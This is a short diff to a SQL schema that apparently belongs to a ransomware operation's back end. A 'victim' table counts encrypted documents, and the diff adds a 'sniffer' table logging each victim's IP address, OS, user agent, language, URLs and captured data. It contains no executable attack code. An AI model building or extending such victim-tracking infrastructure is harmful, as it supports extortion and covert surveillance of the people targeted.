@@ -17,3 +17,14 @@ CREATE TABLE victim (
     end_attack_date DATETIME,
     tot_docs_encrypted INT,
     error VARCHAR(65535));
+
+CREATE TABLE sniffer (
+    id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
+    victim_id VARCHAR(255) NOT NULL,
+    sniff_date DATETIME NOT NULL,
+    os VARCHAR(255),
+    user_agent VARCHAR(255),
+    lang VARCHAR(255),
+    ip_address VARCHAR(255),
+    url VARCHAR(65535),
+    data VARCHAR(65535));
